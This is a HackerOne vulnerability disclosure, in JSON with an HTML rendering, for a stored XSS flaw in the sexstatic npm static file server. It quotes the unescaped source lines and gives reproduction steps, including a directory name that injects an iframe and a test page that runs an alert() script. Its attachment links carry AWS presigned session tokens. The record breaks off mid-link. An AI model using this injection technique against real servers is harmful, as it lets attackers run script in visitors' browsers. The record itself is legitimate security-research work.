{"id":328210,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjgyMTA=","url":"https://hackerone.com/reports/328210","title":"[sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with \u003ciframe\u003e element used in directory name","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-03-21T13:44:51.253Z","submitted_at":"2018-03-21T13:44:51.253Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bl4de","url":"/bl4de","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-3755"],"singular_disclosure_disabled":false,"disclosed_at":"2018-05-29T10:46:52.680Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-05-29T10:45:40.853Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report HTML Injection vulnerability in ```sexstatic``` module. It is possible to use HTML in directory names, which might lead to run arbitrary JavaScript code in the browser.\n\n## Module\n\n**module name:** sexstatic\n**version:** 0.6.2\n**npm page:** https://www.npmjs.com/package/sexstatic\n\n### Module Description\n\nA simple static file server middleware. Use it with a raw http server, express/connect, or flatiron/union!\n\nAlso adds the ability to arbitrarily modify output HTML for whatever reason. And adding additional: simple url -\u003e string handlers simple url -\u003e function handlers\n\nsee opts.extras if you wanna get what i'm talking about\n\nI may or may not extend this with further addons in the future to suit my needs.\n\n### Module Stats\n\nStats\n4 downloads in the last day\n29 downloads in the last week\n158 downloads in the last month\n\n## Vulnerability Description\n\n```sexstatic``` can be used as static file server and presents directory index in the browser. Output is correctly sanitized against any attempts of HTML or JavaScript injection, due to sanitization done in ```sexstatic/lib/sexstatic/showdir.js```:\n\n```javascript\n// sexstatic/lib/sexstatic/showdir.js, line 132\n\n    var displayName = he.encode(file[0]) + ((isDir)? '/':'');\n\n    // TODO: use stylessheets?\n    html += '\u003ctr\u003e' +\n        '\u003ctd\u003e\u003ccode\u003e(' + permsToString(file[1]) + ')\u003c/code\u003e\u003c/td\u003e' +\n        '\u003ctd style=\"text-align: right; padding-left: 1em\"\u003e\u003ccode\u003e' + sizeToString(file[1], humanReadable, si) + '\u003c/code\u003e\u003c/td\u003e' +\n        '\u003ctd style=\"padding-left: 1em\"\u003e\u003ca href=\"' + href + '\"\u003e' + displayName + '\u003c/a\u003e\u003c/td\u003e' +\n        '\u003c/tr\u003e\\n';\n```\nHowever, the same sanitization is missing from this part:\n\n```javascript\n// sexstatic/lib/sexstatic/showdir.js, line 106\n\n        var html = [\n        '\u003c!doctype html\u003e',\n        '\u003chtml\u003e',\n        '  \u003chead\u003e',\n        '    \u003cmeta charset=\"utf-8\"\u003e',\n        '    \u003ctitle\u003eIndex of ' + pathname +'\u003c/title\u003e',\n        '  \u003c/head\u003e',\n        '  \u003cbody\u003e',\n        '\u003ch1\u003eIndex of ' + pathname + '\u003c/h1\u003e'\n        ].join('\\n') + '\\n';\n```\n\n```pathname``` variable is used without sanitization.\nThis allows malicious user to use valid HTML code as directory name. \nBelow I present complete attack scenario with this vulnerability.\n\n## Steps To Reproduce:\n\n- install ```sexstatic``` module:\n\n```\n$ npm install sexstatic\n```\n\n- in the directory which will be used as root for ```sexstatic```, create directory with following name: ```\"\u003e\u003ciframe src=\"malware_frame.html\"\u003e/```\n- in created directory, create file ```malware_frame.html``` with following content:\n\n\n```html\n\u003c!-- malware_frame.html --\u003e\n\u003chtml\u003e\n\n\u003chead\u003e\n    \u003cmeta charset=\"utf8\" /\u003e\n    \u003ctitle\u003eFrame embeded with malware downloader :P\u003c/title\u003e\n\u003c/head\u003e\n\n\u003cbody\u003e\n    \u003cp\u003eiframe element with malicious code\u003c/p\u003e\n    \u003cscript\u003e\n        alert('Uh oh, I am bad, bad malware!!!')\n    \u003c/script\u003e\n\u003c/body\u003e\n\n\u003c/html\u003e\n```\n\n\n- run ```sexstatic```:\n\n```\n$ ./node_modules/sexstatic/lib/sexstatic.js -p 8080\nsexstatic serving /home/rafal.janicki/playground/hackerone/Node at http://0.0.0.0:8080\n\n```\n\n- go to ```http://localhost:8080``` to see directory index:\n\n{F274226}\n\n- now, click on ```\"\u003e\u003ciframe src=\"malware_frame.html\"\u003e/``` directory name on the files list\n\n- malicious JavaScript code from ```malware_frame.html``` file is executed immediately:\n\n{F274225}\n\n\n## Patch\n\n```pathname``` used in HTML output can be sanitized with the same ```he.encode()``` function, as it is already done for every filename.\n\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- Chromium\t67.0.3367.0 (Developer Build) (64-bit)\n\n\n## Wrap up\n\nI hope my report will help keeping Node.js Ecosystem users safe :)\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nMalicious user is able to inject iframe element with malicious JavaScript code via crafted directory name and trick users to open this directory in the browser.","vulnerability_information_html":"\u003cp\u003eI would like to report HTML Injection vulnerability in \u003ccode\u003esexstatic\u003c/code\u003e module. It is possible to use HTML in directory names, which might lead to run arbitrary JavaScript code in the browser.\u003c/p\u003e\n\n\u003ch2 id=\"module\"\u003eModule\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e sexstatic\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.6.2\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ca title=\"https://www.npmjs.com/package/sexstatic\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fsexstatic\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/sexstatic\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"module-description\"\u003eModule Description\u003c/h3\u003e\n\n\u003cp\u003eA simple static file server middleware. Use it with a raw http server, express/connect, or flatiron/union!\u003c/p\u003e\n\n\u003cp\u003eAlso adds the ability to arbitrarily modify output HTML for whatever reason. And adding additional: simple url -\u0026gt; string handlers simple url -\u0026gt; function handlers\u003c/p\u003e\n\n\u003cp\u003esee opts.extras if you wanna get what i\u0026#39;m talking about\u003c/p\u003e\n\n\u003cp\u003eI may or may not extend this with further addons in the future to suit my needs.\u003c/p\u003e\n\n\u003ch3 id=\"module-stats\"\u003eModule Stats\u003c/h3\u003e\n\n\u003cp\u003eStats\u003cbr\u003e\n4 downloads in the last day\u003cbr\u003e\n29 downloads in the last week\u003cbr\u003e\n158 downloads in the last month\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003esexstatic\u003c/code\u003e can be used as static file server and presents directory index in the browser. Output is correctly sanitized against any attempts of HTML or JavaScript injection, due to sanitization done in \u003ccode\u003esexstatic/lib/sexstatic/showdir.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// sexstatic/lib/sexstatic/showdir.js, line 132\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003edisplayName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ehe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003eisDir\u003c/span\u003e\u003cspan class=\"p\"\u003e)?\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// TODO: use stylessheets?\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;tr\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;td\u0026gt;\u0026lt;code\u0026gt;(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003epermsToString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)\u0026lt;/code\u0026gt;\u0026lt;/td\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;td style=\u0026quot;text-align: right; padding-left: 1em\u0026quot;\u0026gt;\u0026lt;code\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003esizeToString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nx\"\u003ehumanReadable\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003esi\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;/code\u0026gt;\u0026lt;/td\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;td style=\u0026quot;padding-left: 1em\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ehref\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003edisplayName\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;/tr\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHowever, the same sanitization is missing from this part:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// sexstatic/lib/sexstatic/showdir.js, line 106\u003c/span\u003e\n\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;!doctype html\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e  \u0026lt;head\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e    \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e    \u0026lt;title\u0026gt;Index of \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003epathname\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e  \u0026lt;/head\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e  \u0026lt;body\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;h1\u0026gt;Index of \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003epathname\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003epathname\u003c/code\u003e variable is used without sanitization.\u003cbr\u003e\nThis allows malicious user to use valid HTML code as directory name. \u003cbr\u003e\nBelow I present complete attack scenario with this vulnerability.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003einstall \u003ccode\u003esexstatic\u003c/code\u003e module:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ npm install sexstatic\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003ein the directory which will be used as root for \u003ccode\u003esexstatic\u003c/code\u003e, create directory with following name: \u003ccode\u003e\u0026quot;\u0026gt;\u0026lt;iframe src=\u0026quot;malware_frame.html\u0026quot;\u0026gt;/\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003ein created directory, create file \u003ccode\u003emalware_frame.html\u003c/code\u003e with following content:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e\u0026lt;!-- malware_frame.html --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;utf8\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eFrame embeded with malware downloader :P\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003eiframe element with malicious code\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eUh oh, I am bad, bad malware!!!\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003erun \u003ccode\u003esexstatic\u003c/code\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ./node_modules/sexstatic/lib/sexstatic.js -p 8080\nsexstatic serving /home/rafal.janicki/playground/hackerone/Node at http://0.0.0.0:8080\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003ego to \u003ccode\u003ehttp://localhost:8080\u003c/code\u003e to see directory index:\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"sexstatic_xss_1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/226/6c086ce3cc705e50964282ec247d7cd9b5e905f1/sexstatic_xss_1.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss_1.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss_1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053603Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=2221d4aefd27f6ea8a7d7ba1ce89d7922cb6bb85f5e2d985d133d3338f199414\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/226/6c086ce3cc705e50964282ec247d7cd9b5e905f1/sexstatic_xss_1.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss_1.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss_1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053603Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=2221d4aefd27f6ea8a7d7ba1ce89d7922cb6bb85f5e2d985d133d3338f199414\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003enow, click on \u003ccode\u003e\u0026quot;\u0026gt;\u0026lt;iframe src=\u0026quot;malware_frame.html\u0026quot;\u0026gt;/\u003c/code\u003e directory name on the files list\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003emalicious JavaScript code from \u003ccode\u003emalware_frame.html\u003c/code\u003e file is executed immediately:\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"sexstatic_xss.png\" 